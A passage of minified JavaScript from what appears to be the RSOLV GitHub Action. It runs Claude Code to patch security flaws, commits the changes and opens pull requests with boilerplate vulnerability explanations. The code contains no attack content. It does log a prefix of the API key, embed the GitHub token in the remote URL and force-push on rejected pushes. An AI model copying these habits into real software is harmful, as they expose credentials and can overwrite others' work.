${j}`)}catch(L){V.error("Failed to get git debug info:",L)}if(K.length===0)return{success:!1,message:"No files were modified",error:"Claude Code did not make any file changes. The vulnerability may not exist or could not be located."};V.info(`Files modified by Claude Code: ${K.join(", ")}`);let B=this.getDiffStats(),q;if(U.changes){if(U.changes.summary)try{q=JSON.parse(U.changes.summary)}catch(L){V.warn("Failed to parse summary JSON",L)}if(!q&&Object.keys(U.changes).length>0){let L=Object.values(U.changes)[0];if(typeof L==="string"&&L.includes("{"))try{q=JSON.parse(L)}catch(R){q={title:`Fix security vulnerability in ${K[0]}`,description:L}}}}let Z=this.createCommitMessage(q?.title||`Fix security vulnerability in ${X.title}`,q?.description||U.message||"Applied security fixes",X.number),M=this.createCommit(K,Z);return V.info(`[GIT-ADAPTER] Created commit: ${M}`),{success:!0,message:`Successfully fixed vulnerabilities in ${K.length} file(s)`,filesModified:K,commitHash:M,diffStats:B,summary:q?{title:q.title,description:q.description,securityImpact:q.securityImpact||"Vulnerabilities have been patched",tests:q.testingGuidance||q.tests||[]}:{title:`Fix security vulnerability: ${X.title}`,description:U.message||"Security vulnerabilities fixed",securityImpact:"Vulnerabilities have been patched",tests:[]}}}catch($){return V.error("Git-based solution generation failed",$),{success:!1,message:"Failed to generate solution",error:`Git-based solution generation failed: ${$ instanceof Error?$.message:String($)}`}}}getModifiedFiles(){try{let X=g6("git diff --name-only",{cwd:this.repoPath,encoding:"utf-8"}).trim();return X?X.split(`
`):[]}catch(X){return V.error("Failed to get modified files",X),[]}}getDiffStats(){try{let Q=g6("git diff --stat",{cwd:this.repoPath,encoding:"utf-8"}).match(/(\d+) files? changed(?:, (\d+) insertions?\(\+\))?(?:, (\d+) deletions?\(-\))?/);if(Q)return{filesChanged:parseInt(Q[1],10),insertions:parseInt(Q[2]||"0",10),deletions:parseInt(Q[3]||"0",10)};return{filesChanged:0,insertions:0,deletions:0}}catch(X){return V.error("Failed to get diff stats",X),{filesChanged:0,insertions:0,deletions:0}}}createCommit(X,Q){try{try{g6("git config user.email",{cwd:this.repoPath})}catch{g6('git config user.email "rsolv@users.noreply.github.com"',{cwd:this.repoPath}),g6('git config user.name "RSOLV Bot"',{cwd:this.repoPath})}g6(`git add ${X.join(" ")}`,{cwd:this.repoPath});let J=O0("fs"),Y=O0("os"),G=O0("path").join(Y.tmpdir(),`commit-msg-${Date.now()}.txt`);J.writeFileSync(G,Q);try{g6(`git commit -F "${G}"`,{cwd:this.repoPath})}finally{try{J.unlinkSync(G)}catch{}}let H=g6("git rev-parse HEAD",{cwd:this.repoPath,encoding:"utf-8"}).trim();return V.info(`Created commit ${H.substring(0,8)}: ${Q.split(`
`)[0]}`),H}catch(J){throw V.error("Failed to create commit",J),J}}createCommitMessage(X,Q,J){return`${X}

${Q}

Fixes #${J}

This commit was automatically generated by RSOLV to fix security vulnerabilities.`}async generateSolutionWithContext(X,Q,J,Y){return V.info("[Legacy Adapter] generateSolutionWithContext delegating to generateSolutionWithGit"),this.generateSolutionWithGit(X,Q)}async gatherDeepContext(X,Q={}){return V.info("[Legacy Adapter] gatherDeepContext not supported - returning empty context"),{files:[],architecture:void 0,testPatterns:void 0,styleGuide:void 0,dependencies:void 0}}async generateSolution(X,Q,J){return V.info("[Legacy Adapter] generateSolution delegating to generateSolutionWithGit"),this.generateSolutionWithGit(X,Q)}}var uC=$1(()=>{DK();y1();mC()});import{execSync as U8}from"child_process";import*as n5 from"fs";import*as cC from"os";import*as QG from"path";function K8(X){let Q=process.env.RSOLV_FORCE_SDK_ADAPTER==="true",J=process.env.RSOLV_FORCE_LEGACY_ADAPTER==="true";if(Q)return V.info("[SDK Factory] RSOLV_FORCE_SDK_ADAPTER=true: forcing ClaudeAgentSDKAdapter"),new $J(X);if(J){V.info("[SDK Factory] RSOLV_FORCE_LEGACY_ADAPTER=true: forcing legacy adapter");let W={provider:"anthropic",model:X.model||"claude-sonnet-4-5-20250929",useVendedCredentials:X.useVendedCredentials,useStructuredPhases:!0,claudeCodeConfig:{verboseLogging:X.verbose}};return new XG(W,X.repoPath,X.credentialManager)}if(X.credentialManager?.shouldUseLegacyAdapter?.()??!1){V.info("[SDK Factory] Feature flag enabled: using legacy GitBasedClaudeCodeAdapter");let W={provider:"anthropic",model:X.model||"claude-sonnet-4-5-20250929",useVendedCredentials:X.useVendedCredentials,useStructuredPhases:!0,claudeCodeConfig:{verboseLogging:X.verbose}};return new XG(W,X.repoPath,X.credentialManager)}return V.info("[SDK Factory] Using ClaudeAgentSDKAdapter (new unified adapter)"),new $J(X)}var __dirname="/home/dylan/dev/rsolv/RSOLV-action/src/ai/adapters",tK,$J;var zJ=$1(()=>{vI();y1();uC();tK={type:"object",properties:{title:{type:"string",description:"Title of the fix"},description:{type:"string",description:"Description of what was fixed"},securityImpact:{type:"string",description:"Security impact assessment"},files:{type:"array",items:{type:"object",properties:{path:{type:"string"},changes:{type:"string"}},required:["path","changes"]}},tests:{type:"array",items:{type:"string"},description:"Tests that validate the fix"},finalStatus:{type:"string",enum:["PASS","FAIL"],description:"Whether all tests pass"}},required:["title","description"]};$J=class $J{repoPath;credentialManager;useVendedCredentials;maxTurns;model;testFilePatterns;verbose;testLog=[];sessionId;constructor(X){this.repoPath=X.repoPath,this.credentialManager=X.credentialManager,this.useVendedCredentials=X.useVendedCredentials??!1,this.maxTurns=X.maxTurns??3,this.model=X.model,this.testFilePatterns=X.testFilePatterns??["test/","tests/","__tests__/","*.test.ts","*.test.js","*.spec.ts","*.spec.js","_test.go","_test.py"],this.verbose=X.verbose??!1}async getApiKey(){if(this.useVendedCredentials&&this.credentialManager)return await this.credentialManager.getCredential("anthropic");return process.env.ANTHROPIC_API_KEY||""}buildEnvForSDK(X){return{PATH:process.env.PATH||"/usr/local/bin:/usr/bin:/bin:/app/node_modules/.bin",ANTHROPIC_API_KEY:X,HOME:process.env.HOME||"/root",CI:"true",NODE_ENV:"development",USER:process.env.USER||"root",SHELL:process.env.SHELL||"/bin/bash",TERM:process.env.TERM||"xterm-256color"}}getClaudeCodeExecutablePath(){let X=["/app/node_modules/@anthropic-ai/claude-code/cli.js",QG.join(process.cwd(),"node_modules","@anthropic-ai","claude-code","cli.js"),QG.join(__dirname,"..","..","..","node_modules","@anthropic-ai","claude-code","cli.js")];for(let Q of X)if(n5.existsSync(Q))return V.info(`[SDK] Found Claude Code CLI at: ${Q}`),Q;try{let Q=U8("which claude 2>/dev/null || where claude 2>/dev/null",{encoding:"utf-8"}).trim();if(Q)return V.info(`[SDK] Found Claude Code CLI via PATH: ${Q}`),Q}catch{}return V.warn("[SDK] Claude Code CLI not found at any expected location, using default path"),X[0]}isTestFile(X){let Q=X.replace(/\\/g,"/");return this.testFilePatterns.some((J)=>{if(J.endsWith("/"))return Q.includes(J)||Q.startsWith(J);else if(J.startsWith("*")){let Y=J.slice(1);return Q.endsWith(Y)}else if(J.startsWith("_"))return Q.endsWith(J);return!1})}isTestCommand(X){if(!X)return!1;return[/\bnpm\s+test\b/,/\bnpm\s+run\s+test\b/,/\bpnpm\s+test\b/,/\byarn\s+test\b/,/\bjest\b/,/\bvitest\b/,/\bmocha\b/,/\bpytest\b/,/\bgo\s+test\b/,/\bmix\s+test\b/,/\bcargo\s+test\b/,/\brspec\b/].some((J)=>J.test(X))}createCanUseTool(){return async(X,Q,J)=>{if(X==="Edit"||X==="Write"){let Y=Q.file_path||Q.path;if(Y&&this.isTestFile(Y))return V.warn(`Denied edit to test file: ${Y}`),{behavior:"deny",message:`Cannot modify test files. Test file protection is enabled for: ${Y}`}}return{behavior:"allow",updatedInput:Q}}}createHooks(){return{PostToolUse:[{matcher:"Bash",hooks:[async(Q,J,Y)=>{let W=Q;if(W.tool_name==="Bash"){let G=W.tool_input?.command;if(this.isTestCommand(G)){if(this.testLog.push({command:G,output:String(W.tool_response||""),timestamp:Date.now()}),this.verbose)V.info(`Test command executed: ${G.substring(0,50)}...`)}}return{continue:!0}}]}]}}static EXCLUDED_PATH_PATTERNS=[/^\.github\/workflows\//,/^\.github\/actions\//];getModifiedFiles(){try{let X=U8("git diff --name-only",{cwd:this.repoPath,encoding:"utf-8"}).trim();if(!X)return[];let Q=X.split(`
`),J=Q.filter((W)=>$J.EXCLUDED_PATH_PATTERNS.some((G)=>G.test(W))),Y=Q.filter((W)=>!$J.EXCLUDED_PATH_PATTERNS.some((G)=>G.test(W)));if(J.length>0)V.warn(`[MITIGATE] Excluding ${J.length} files from commit: ${J.join(", ")}`),this.revertExcludedFiles(J);return Y}catch(X){return V.error("Failed to get modified files",X),[]}}revertExcludedFiles(X){for(let Q of X)try{U8(`git checkout -- "${Q}"`,{cwd:this.repoPath,encoding:"utf-8"})}catch(J){V.warn(`[MITIGATE] Failed to revert excluded file ${Q}: ${J.message}`)}}getDiffStats(){try{let Q=U8("git diff --stat",{cwd:this.repoPath,encoding:"utf-8"}).match(/(\d+) files? changed(?:, (\d+) insertions?\(\+\))?(?:, (\d+) deletions?\(-\))?/);if(Q)return{filesChanged:parseInt(Q[1],10),insertions:parseInt(Q[2]||"0",10),deletions:parseInt(Q[3]||"0",10)};return{filesChanged:0,insertions:0,deletions:0}}catch(X){return V.error("Failed to get diff stats",X),{filesChanged:0,insertions:0,deletions:0}}}createCommit(X,Q){try{try{U8("git config user.email",{cwd:this.repoPath})}catch{U8('git config user.email "rsolv@users.noreply.github.com"',{cwd:this.repoPath}),U8('git config user.name "RSOLV Bot"',{cwd:this.repoPath})}U8(`git add ${X.join(" ")}`,{cwd:this.repoPath});let J=QG.join(cC.tmpdir(),`commit-msg-${Date.now()}.txt`);n5.writeFileSync(J,Q);try{U8(`git commit -F "${J}"`,{cwd:this.repoPath})}finally{try{n5.unlinkSync(J)}catch{}}let Y=U8("git rev-parse HEAD",{cwd:this.repoPath,encoding:"utf-8"}).trim();return V.info(`Created commit ${Y.substring(0,8)}: ${Q.split(`
`)[0]}`),Y}catch(J){throw V.error("Failed to create commit",J),J}}createCommitMessage(X,Q,J){return`${X}

${Q}

Fixes #${J}

This commit was automatically generated by RSOLV to fix security vulnerabilities.`}buildPrompt(X,Q){return`You are fixing a security vulnerability in this codebase.

## Issue
**Title:** ${X.title}
**Description:** ${X.body}

## Analysis
**Summary:** ${Q.summary}
**Complexity:** ${Q.complexity}
**Recommended Approach:** ${Q.recommendedApproach}
${Q.relatedFiles?`**Related Files:** ${Q.relatedFiles.join(", ")}`:""}
${Q.requiredChanges?`**Required Changes:** ${Q.requiredChanges.join(", ")}`:""}

## Instructions
1. First, read the relevant files to understand the current implementation
2. Apply the security fix using the Edit tool
3. Run any existing tests to ensure the fix doesn't break functionality
4. Provide a summary of what was changed and why

Important:
- Do NOT modify test files - they are protected
- Make minimal changes to fix the vulnerability
- Follow existing code style and patterns
- Ensure backwards compatibility where possible`}constructPrompt(X,Q,J){return this.buildPrompt(X,Q)}async generateSolutionWithGit(X,Q,J,Y,W,G){this.testLog=[];try{let H=await this.getApiKey();process.env.ANTHROPIC_API_KEY=H,V.info(`[SDK] API key obtained (length: ${H.length}, prefix: ${H.substring(0,10)}...)`);let $=this.buildPrompt(X,Q),z={cwd:this.repoPath,allowedTools:["Read","Edit","Bash","Glob","Grep"],permissionMode:"acceptEdits",maxTurns:this.maxTurns,model:this.model,pathToClaudeCodeExecutable:this.getClaudeCodeExecutablePath(),executable:"node",env:this.buildEnvForSDK(H),outputFormat:{type:"json_schema",schema:tK},canUseTool:this.createCanUseTool(),hooks:this.createHooks()},U,K=0,B=0;V.info(`[SDK] Starting query with prompt length: ${$.length}, repoPath: ${this.repoPath}`);let q=j7({prompt:$,options:z});for await(let j of q){if(j.type==="system"&&"subtype"in j&&j.subtype==="init")this.sessionId=j.session_id,V.info(`[SDK] Session initialized: ${this.sessionId}`);if(j.type==="assistant"&&"message"in j){let F=j.message;if(F.content){for(let A of F.content)if(A.type==="tool_use"){if(K++,A.name==="Edit")B++;V.info(`[SDK] Tool call: ${A.name} (total: ${K}, edits: ${B})`)}}}if(j.type==="result"){let F=j;if("structured_output"in F&&F.structured_output)U=F.structured_output;V.info(`[SDK] Query completed. Total tool calls: ${K}, Edit calls: ${B}`)}if(this.verbose)V.debug(`SDK message: ${j.type}`)}let Z=this.getModifiedFiles();if(V.info(`[SDK] Modified files detected: ${Z.length} - [${Z.join(", ")}]`),Z.length===0)return V.warn(`[SDK] No files modified. Tool calls made: ${K}, Edit calls: ${B}. This may indicate the SDK did not make any edits or the changes were not written to disk.`),{success:!1,message:"No files were modified",error:`SDK did not make file changes. Tool calls: ${K}, Edit calls: ${B}`};let M=this.getDiffStats(),L=this.createCommitMessage(U?.title||`Fix vulnerability: ${X.title}`,U?.description||"Security fix applied",X.number),R=this.createCommit(Z,L);return{success:!0,message:`Fixed vulnerabilities in ${Z.length} file(s)`,filesModified:Z,commitHash:R,diffStats:M,summary:U?{title:U.title,description:U.description,securityImpact:U.securityImpact||"Security vulnerability addressed",tests:U.tests||[]}:void 0}}catch(H){return V.error("Git-based solution generation failed",H),{success:!1,message:"Failed to generate solution",error:`Git-based solution generation failed: ${H instanceof Error?H.message:String(H)}`}}}getTestLog(){return[...this.testLog]}getSessionId(){return this.sessionId}async generateWithResume(X,Q,J=!1){try{let Y=await this.getApiKey(),W={cwd:this.repoPath,allowedTools:["Read","Edit","Bash","Glob","Grep"],permissionMode:"acceptEdits",maxTurns:this.maxTurns,model:this.model,pathToClaudeCodeExecutable:this.getClaudeCodeExecutablePath(),executable:"node",env:this.buildEnvForSDK(Y),resume:X,forkSession:J,canUseTool:this.createCanUseTool(),hooks:this.createHooks()},G,H=j7({prompt:Q,options:W});for await(let U of H){if(U.type==="system"&&"subtype"in U&&U.subtype==="init")this.sessionId=U.session_id;if(U.type==="result"){let K=U;if("structured_output"in K&&K.structured_output)G=K.structured_output}}let $=this.getModifiedFiles();if($.length===0)return{success:!1,message:"No files were modified in resumed session",error:"SDK did not make file changes"};let z=this.getDiffStats();return{success:!0,message:`Applied changes from ${J?"forked":"resumed"} session`,filesModified:$,diffStats:z,summary:G?{title:G.title,description:G.description,securityImpact:G.securityImpact||"",tests:G.tests||[]}:void 0}}catch(Y){return V.error("Resume session failed",Y),{success:!1,message:"Failed to resume session",error:Y instanceof Error?Y.message:String(Y)}}}async generateWithABTest(X,Q){let J=await this.getApiKey(),Y=`Analyze the codebase to understand the vulnerability:

Issue: ${X.title}
${X.body}

Read the relevant files and understand:
1. Where the vulnerability exists
2. What dependencies are involved
3. What tests exist

Do NOT make any changes yet.`,W={cwd:this.repoPath,allowedTools:["Read","Glob","Grep"],permissionMode:"default",maxTurns:2,model:this.model,pathToClaudeCodeExecutable:this.getClaudeCodeExecutablePath(),executable:"node",env:this.buildEnvForSDK(J)},G=j7({prompt:Y,options:W});for await(let z of G)if(z.type==="system"&&"subtype"in z&&z.subtype==="init")this.sessionId=z.session_id;if(!this.sessionId)throw Error("Failed to capture session ID for A/B testing");let H=await this.generateWithResume(this.sessionId,"Fix the vulnerability with MINIMAL changes. Only modify what is absolutely necessary.",!0),$=await this.generateWithResume(this.sessionId,"Fix the vulnerability with a thorough approach. Refactor if needed for better security.",!0);return{conservative:H,aggressive:$}}async generateSolution(X,Q,J){this.testLog=[];try{let Y=await this.getApiKey();process.env.ANTHROPIC_API_KEY=Y;let W=this.buildPrompt(X,Q),G={cwd:this.repoPath,allowedTools:["Read","Edit","Bash","Glob","Grep"],permissionMode:"acceptEdits",maxTurns:this.maxTurns,model:this.model,pathToClaudeCodeExecutable:this.getClaudeCodeExecutablePath(),executable:"node",env:this.buildEnvForSDK(Y),outputFormat:{type:"json_schema",schema:tK},canUseTool:this.createCanUseTool(),hooks:this.createHooks()},H,$=j7({prompt:W,options:G});for await(let U of $){if(U.type==="system"&&"subtype"in U&&U.subtype==="init")this.sessionId=U.session_id;if(U.type==="result"){let K=U;if("structured_output"in K&&K.structured_output)H=K.structured_output}}let z=this.getModifiedFiles();return{success:z.length>0,message:z.length>0?`Modified ${z.length} file(s)`:"No files were modified",filesModified:z,diffStats:this.getDiffStats(),summary:H?{title:H.title,description:H.description,securityImpact:H.securityImpact||"",tests:H.tests||[]}:void 0}}catch(Y){return V.error("Solution generation failed",Y),{success:!1,message:"Failed to generate solution",error:Y instanceof Error?Y.message:String(Y)}}}async generateSolutionWithContext(X,Q,J,Y){let W=`${this.buildPrompt(X,Q)}

Additional context gathering instructions:
1. First explore the codebase to understand the architecture
2. Read related files and tests
3. Then apply the fix with full context

This is single-pass mode - gather context and fix in one session.`;try{let G=await this.getApiKey();process.env.ANTHROPIC_API_KEY=G;let H={cwd:this.repoPath,allowedTools:["Read","Edit","Bash","Glob","Grep"],permissionMode:"acceptEdits",maxTurns:this.maxTurns+2,model:this.model,pathToClaudeCodeExecutable:this.getClaudeCodeExecutablePath(),executable:"node",env:this.buildEnvForSDK(G),outputFormat:{type:"json_schema",schema:tK},canUseTool:this.createCanUseTool(),hooks:this.createHooks()},$,z=j7({prompt:W,options:H});for await(let K of z){if(K.type==="system"&&"subtype"in K&&K.subtype==="init")this.sessionId=K.session_id;if(K.type==="result"){let B=K;if("structured_output"in B&&B.structured_output)$=B.structured_output}}let U=this.getModifiedFiles();return{success:U.length>0,message:U.length>0?`Modified ${U.length} file(s) with context`:"No files were modified",filesModified:U,diffStats:this.getDiffStats(),summary:$?{title:$.title,description:$.description,securityImpact:$.securityImpact||"",tests:$.tests||[]}:void 0}}catch(G){return V.error("Solution generation with context failed",G),{success:!1,message:"Failed to generate solution with context",error:G instanceof Error?G.message:String(G)}}}async gatherDeepContext(X,Q={}){let J={shallow:"Quick overview of directly related files only",medium:"Related files and immediate dependencies",deep:"Full exploration including tests and documentation",ultra:"Comprehensive codebase analysis with architecture mapping"},Y=Q.contextDepth||"medium",W=`Explore this codebase to gather context for fixing:

Issue: ${X.title}
${X.body}

Exploration depth: ${Y}
Instructions: ${J[Y]}

${Q.includeArchitectureAnalysis?"- Analyze the overall architecture":""}
${Q.includeTestPatterns?"- Identify testing patterns and frameworks":""}
${Q.includeStyleGuide?"- Note code style conventions":""}
${Q.includeDependencyAnalysis?"- Analyze dependencies":""}

Use Read, Glob, and Grep to explore. Do NOT make any changes.`;try{let G=await this.getApiKey();process.env.ANTHROPIC_API_KEY=G;let H={cwd:this.repoPath,allowedTools:["Read","Glob","Grep"],permissionMode:"default",maxTurns:Y==="ultra"?5:Y==="deep"?4:Y==="medium"?3:2,model:this.model,pathToClaudeCodeExecutable:this.getClaudeCodeExecutablePath(),executable:"node",env:this.buildEnvForSDK(G)},$=[],z=j7({prompt:W,options:H});for await(let U of z){if(U.type==="system"&&"subtype"in U&&U.subtype==="init")this.sessionId=U.session_id;let K=U;if(K.name==="Read"&&K.input?.file_path)$.push(K.input.file_path)}return{files:$,architecture:Q.includeArchitectureAnalysis?"Architecture analysis gathered":void 0,testPatterns:Q.includeTestPatterns?"Test patterns identified":void 0,styleGuide:Q.includeStyleGuide?"Style conventions noted":void 0,dependencies:Q.includeDependencyAnalysis?"Dependencies analyzed":void 0}}catch(G){return V.error("Deep context gathering failed",G),{files:[]}}}}});import{execSync as TX}from"child_process";async function VJ(X,Q,J,Y,W,G){try{if(!Q||typeof Q!=="string"){let Z=`Invalid commitHash: expected string, got ${typeof Q}. This usually means the solution generation did not create any commits - check if the SDK made file modifications.`;return V.error(Z),{success:!1,message:"Cannot create PR without valid commit",error:Z}}V.info(`Creating educational PR from commit ${Q.substring(0,8)} for issue #${X.number}`);try{TX("git config user.email",{cwd:process.cwd()})}catch{V.info("Configuring git user for GitHub Actions"),TX('git config user.email "rsolv@users.noreply.github.com"',{cwd:process.cwd()}),TX('git config user.name "RSOLV Bot"',{cwd:process.cwd()})}let H=`rsolv/fix-issue-${X.number}`;try{TX(`git checkout -b ${H}`,{cwd:process.cwd()}),V.info(`Created branch: ${H}`)}catch(Z){TX(`git checkout ${H}`,{cwd:process.cwd()}),V.info(`Switched to existing branch: ${H}`)}let $=process.env.GITHUB_TOKEN||process.env.GH_PAT;if($&&process.env.GITHUB_REPOSITORY){let[Z,M]=process.env.GITHUB_REPOSITORY.split("/"),L=`https://x-access-token:${$}@github.com/${Z}/${M}.git`;try{TX(`git remote set-url origin ${L}`,{cwd:process.cwd()}),V.debug("Configured git authentication for push")}catch(R){V.debug("Could not configure authenticated remote")}}try{TX(`git push -u origin ${H}`,{cwd:process.cwd()}),V.info(`Pushed branch: ${H}`)}catch(Z){let M=Z.message||String(Z);if(M.includes("Updates were rejected")||M.includes("already exists")||M.includes("non-fast-forward")){V.info("Branch exists on remote, attempting force push");try{TX(`git push -f origin ${H}`,{cwd:process.cwd()}),V.info(`Force pushed branch: ${H}`)}catch(L){throw V.error("Force push also failed",L),L}}else throw V.error("Failed to push branch",{error:M,branch:H}),Z}let z=ut1(J,X),U=it1(X,J,z,W,G),K=v0(),[B,q]=X.repository.fullName.split("/");try{let Z=J.isTestMode&&J.validationFailed?"[TEST MODE] ":"",{data:M}=await K.pulls.create({owner:B,repo:q,title:`${Z}[RSOLV] ${J.title} (fixes #${X.number})`,body:U,head:H,base:X.repository.defaultBranch||"main",maintainer_can_modify:!0});if(V.info(`Created educational pull request #${M.number}: ${M.html_url}`),Y.rsolvApiKey)try{await new _8(Y.rsolvApiKey).createFixAttempt({issueId:X.id,issueNumber:X.number,repository:X.repository.fullName,pullRequestUrl:M.html_url,pullRequestNumber:M.number,branchName:H,commitHash:Q,metadata:{hasEducationalContent:!0,vulnerabilityType:J.vulnerabilityType,severity:J.severity}}),V.info("Tracked educational fix in RSOLV API")}catch(L){V.warn("Failed to track in RSOLV API",L)}return{success:!0,message:`Created educational pull request #${M.number}`,pullRequestUrl:M.html_url,pullRequestNumber:M.number,branchName:H,commitHash:Q,educationalContent:z}}catch(Z){if(Z.status===422&&Z.message?.includes("pull request already exists")){V.warn("Pull request already exists for this branch");let{data:M}=await K.pulls.list({owner:B,repo:q,head:`${B}:${H}`,state:"open"});if(M.length>0){let L=M[0];return{success:!0,message:`Pull request already exists: #${L.number}`,pullRequestUrl:L.html_url,pullRequestNumber:L.number,branchName:H,commitHash:Q,educationalContent:z}}}throw Z}}catch(H){return V.error("Failed to create educational pull request",H),{success:!1,message:"Failed to create pull request",error:H instanceof Error?H.message:String(H)}}}function lC(X){let Q=X.toUpperCase().replace(/[\s-]+/g,"_");if(UJ[Q])return Q;return{SQL_INJECTION:"SQLi",SQLI:"SQLi",SQL_INJECTION_FORMAT:"SQLi",SQL_INJECTION_CONCAT:"SQLi",SQL_INJECTION_FSTRING:"SQLi",CROSS_SITE_SCRIPTING:"XSS",XSS:"XSS",CODE_INJECTION:"CODE_INJECTION",EVAL_INJECTION:"CODE_INJECTION",PROTOTYPE_POLLUTION:"PROTOTYPE_POLLUTION",HARDCODED_CREDENTIALS:"HARDCODED_CREDENTIALS",HARDCODED_SECRETS:"HARDCODED_CREDENTIALS",PATH_TRAVERSAL:"PATH_TRAVERSAL",DIRECTORY_TRAVERSAL:"PATH_TRAVERSAL",COMMAND_INJECTION:"COMMAND_INJECTION",OS_COMMAND_INJECTION:"COMMAND_INJECTION",INSECURE_DESERIALIZATION:"INSECURE_DESERIALIZATION",UNSAFE_DESERIALIZATION:"INSECURE_DESERIALIZATION",CSRF:"CSRF",CROSS_SITE_REQUEST_FORGERY:"CSRF",XXE:"XXE",XML_EXTERNAL_ENTITY:"XXE",SLOPSQUATTING:"slopsquatting",SSTI:"SSTI",SERVER_SIDE_TEMPLATE_INJECTION:"SSTI",TEMPLATE_INJECTION:"SSTI",INPUT_VALIDATION:"XSS",SECURITY:"XSS"}[Q]||Q}function ut1(X,Q){let J=[],Y=lC(X.vulnerabilityType||"SECURITY"),W=UJ[Y]||UJ.XSS;if(J.push(`## What is ${W.title}?`),J.push(W.description),J.push(""),J.push("## How this fix prevents the vulnerability:"),J.push(W.prevention),W.example)J.push(""),J.push("**Example:**"),J.push(W.example);if(J.push(""),J.push("## Best practices:"),J.push("- Always validate and sanitize user input"),J.push("- Apply the principle of least privilege"),J.push("- Keep dependencies updated"),J.push("- Implement security headers"),J.push("- Use security linters and scanners in CI/CD"),X.isAiGenerated||Y==="SLOPSQUATTING")J.push(""),J.push("## \uD83E\uDD16 AI-Specific Vulnerability Context"),J.push("This vulnerability is related to AI-generated code. Our research shows:"),J.push("- 19.6% of AI package suggestions are hallucinated (non-existent)"),J.push("- Attackers actively exploit these by registering malicious packages"),J.push("- Always verify package existence before adding dependencies");return J.push(""),J.push("## About RSOLV"),J.push("RSOLV automatically fixes security vulnerabilities, not just detects them."),J.push("- 181 patterns across 8 languages and frameworks"),J.push("- Success-based pricing: only pay for deployed fixes"),J.push("- Detects AI-specific vulnerabilities others miss"),J.push("- AST-based analysis for minimal false positives"),J.join(`
`)}function ct1(X){if(!X?.branchName)return[];return[KJ.VALIDATION_TESTS,"","This fix was validated using RED tests from the VALIDATE phase:","",`**Validation Branch:** [\`${X.branchName}\`](../../tree/${X.branchName})`,"","The validation branch contains RED tests that:","-  **Failed** on the vulnerable code (proving the vulnerability exists)","-  **Pass** after this fix is applied (proving the fix works)","","This test-driven approach ensures the fix addresses the actual vulnerability.",""]}function lt1(X){if(!X?.testResults)return[];let{passed:Q=0,failed:J=0,total:Y=0}=X.testResults;return[KJ.TEST_RESULTS,"","### Before Fix (RED Tests)","```",`Tests: ${J} failed, ${Q} passed, ${Y} total`,"Status:  FAILING (vulnerability present)","```","","### After Fix (GREEN Tests)","```",`Tests: 0 failed, ${Y} passed, ${Y} total`,"Status:  PASSING (vulnerability fixed)","```",""]}function pt1(X){if(!X.example)return[];return[KJ.ATTACK_EXAMPLE,"","**How this vulnerability could be exploited:**","","```",X.example,"```","","This fix prevents such attacks by applying proper input validation and sanitization.",""]}function dt1(X,Q){let J=[KJ.LEARNING_RESOURCES,"","To learn more about this vulnerability type:",""];if(X.cwe)J.push(`- [CWE-${X.cwe}](https://cwe.mitre.org/data/definitions/${X.cwe}.html) - Common Weakness Enumeration`);return J.push(`- [OWASP: ${Q.title}](https://owasp.org) - Security best practices`),J.push("- [RSOLV Security Patterns](https://rsolv.dev/patterns) - Comprehensive vulnerability database"),J.push(""),J}function it1(X,Q,J,Y,W){let G=[],H=Q.isTestMode&&Q.validationFailed?"[TEST MODE] ":"";if(G.push(`# ${H}${Q.title}`),G.push(""),Q.isTestMode&&Q.validationFailed){if(G.push(">  **TEST MODE**: This PR was created despite validation failures to allow inspection of the attempted fix."),G.push("> "),Q.testModeNote)G.push(`> **Validation Issue:** ${Q.testModeNote}`);G.push(""),G.push("---"),G.push("")}if(G.push(`**Fixes:** #${X.number}`),G.push(`**Severity:** ${Q.severity||"Medium"}`),Q.cwe)G.push(`**CWE:** ${Q.cwe}`);G.push(""),G.push(KJ.SUMMARY),G.push(Q.description),G.push("");let $=lC(Q.vulnerabilityType||"SECURITY"),z=UJ[$]||UJ.XSS;if(G.push(...ct1(W)),G.push(...lt1(W)),G.push(...pt1(z)),G.push(...dt1(Q,z)),Y&&Y.filesChanged>0)G.push("## \uD83D\uDCCA Changes Made"),G.push(`- **Files Changed:** ${Y.filesChanged}`),G.push(`- **Lines Added:** +${Y.insertions}`),G.push(`- **Lines Removed:** -${Y.deletions}`),G.push("");if(G.push("## \uD83D\uDCDA Understanding This Fix"),G.push(""),G.push(`### \uD83D\uDEE1 What is ${z.title}?`),G.push(z.description),G.push(""),G.push("### \uD83D\uDD27 How This Fix Works"),G.push(z.prevention),z.example)G.push(""),G.push("**Example:**"),G.push("```"),G.push(z.example),G.push("```");if(G.push(""),G.push("###  Best Practices"),G.push("1. Always validate and sanitize user input"),G.push("2. Apply the principle of least privilege"),G.push("3. Keep dependencies updated"),G.push("4. Implement security headers"),G.push("5. Use security linters and scanners in CI/CD"),G.push(""),Q.tests&&Q.tests.length>0)G.push("## \uD83E\uDDEA Testing Instructions"),Q.tests.forEach((U,K)=>{G.push(`${K+1}. ${U}`)}),G.push("");return G.push("##  Review Checklist"),G.push("- [ ] Changes fix the reported vulnerability"),G.push("- [ ] No new vulnerabilities introduced"),G.push("- [ ] Existing functionality preserved"),G.push("- [ ] Code follows project conventions"),G.push("- [ ] Tests pass (if applicable)"),G.push(""),G.push("## \uD83E\uDD16 About RSOLV"),G.push(""),G.push("[RSOLV](https://rsolv.dev) automatically fixes security vulnerabilities in your code."),G.push(""),G.push("**What makes RSOLV different:**"),G.push("- \uD83D\uDD27 **Fixes, not just reports:** We generate working code, not just vulnerability lists"),G.push("- \uD83D\uDCB0 **Success-based pricing:** Only pay for fixes that get deployed"),G.push("- \uD83E\uDD16 **AI-aware security:** Detect vulnerabilities specific to AI-generated code"),G.push("- \uD83C\uDFAF **181+ patterns:** Comprehensive coverage across 8 languages and frameworks"),G.push("- \uD83C\uDF33 **AST-based analysis:** Minimal false positives through syntax tree parsing"),G.push(""),G.push("---"),G.push(""),G.push("*This PR was automatically generated by [RSOLV](https://rsolv.dev) using direct file editing.*"),G.push(`*Learn more about ${z.title} on [OWASP](https://owasp.org)*`),G.join(`
